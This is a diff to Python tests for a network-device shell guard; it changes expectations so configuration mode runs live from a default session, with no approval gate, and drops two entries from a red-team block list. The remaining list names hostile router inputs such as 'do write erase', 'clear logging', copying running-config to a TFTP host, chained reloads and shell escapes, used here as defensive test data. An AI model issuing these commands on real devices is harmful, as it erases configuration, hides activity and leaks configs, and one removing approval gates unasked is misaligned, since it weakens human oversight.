@@ -1,7 +1,8 @@
-"""Shell Guard tests — the guard is safety-spine code; every gate is proven.
+"""Shell Guard tests — the human shell is live, but still audited.
 
-The invariant under test: nothing reaches the device that the session's mode
-does not permit, and `device_touched` is earned only by forwarded config.
+The invariant under test: config reaches the device without an automation
+approval gate, while destructive, credential, and ambiguous input still fails
+closed or requires confirmation.
 """
 
 from netcode.shell_guard import (
@@ -86,16 +87,14 @@ def test_read_only_session_forwards_show_commands():
     assert state.device_touched is False
 
 
-def test_read_only_session_blocks_config_mode_with_kill_line():
+def test_default_session_allows_config_mode_live():
     state = ShellSessionState()
     decision = type_line(state, "conf t")
-    # typed chars pass through (remote echo), CR is replaced by kill-line
-    assert decision.forward.endswith(KILL_LINE)
-    assert "\r" not in decision.forward
+    assert decision.forward.endswith("\r")
     actions = [e.get("action") for e in decision.events]
-    assert "blocked_config_mode" in actions
-    assert state.in_config is False
-    assert state.device_touched is False
+    assert "config_mode_entered_live" in actions
+    assert state.in_config is True
+    assert state.device_touched is True
 
 
 def test_change_attached_session_allows_config_mode_and_earns_touched():
@@ -229,11 +228,20 @@ def test_rest_single_read_runs():
     assert d["kind"] == "run_reads" and d["lines"] == ["show vlan brief"]
 
 
-def test_rest_config_enter_still_gated_via_guard_submit():
+def test_rest_config_enter_runs_live_via_guard_submit():
     read_only = ShellSessionState()
-    assert guard_submit(read_only, "conf t")["kind"] == "blocked"
+    assert guard_submit(read_only, "conf t")["kind"] == "run_live"
     attached = ShellSessionState(mode="change_attached", change_id="CHG-1")
-    assert guard_submit(attached, "conf t")["kind"] == "config_staged"
+    assert guard_submit(attached, "conf t")["kind"] == "run_live"
+
+
+def test_rest_config_block_runs_live_in_one_session():
+    state = ShellSessionState()
+    decision = guard_submit(state, "configure terminal\ninterface Loopback999\ndescription NETCODE_TEST\nend")
+    assert decision["kind"] == "run_live"
+    assert decision["lines"] == ["configure terminal", "interface Loopback999", "description NETCODE_TEST", "end"]
+    assert state.in_config is False
+    assert state.device_touched is True
 
 
 def test_submit_line_rejects_control_bytes_directly():
@@ -242,14 +250,14 @@ def test_submit_line_rejects_control_bytes_directly():
 
 
 def test_redteam_criticals_are_blocked_at_guard_submit():
-    """The confirmed red-team bypasses, at the real /api/shell/input entry point.
-    None may return run_reads from a read-only session."""
+    """The confirmed red-team bypasses, at the REST shell input entry point.
+    Config is live now; destructive/credential/chaining still cannot execute as
+    ordinary reads."""
     criticals = [
         "do reload", "do write erase",
         "clear ip bgp *", "clear logging",
         "copy running-config tftp://198.51.100.9/rc",
         "write memory", "wr",
-        "config-transaction", "configuration",
         "show clock ; reload", "show version && configure terminal",
         "tclsh", "bash", "python",
     ]
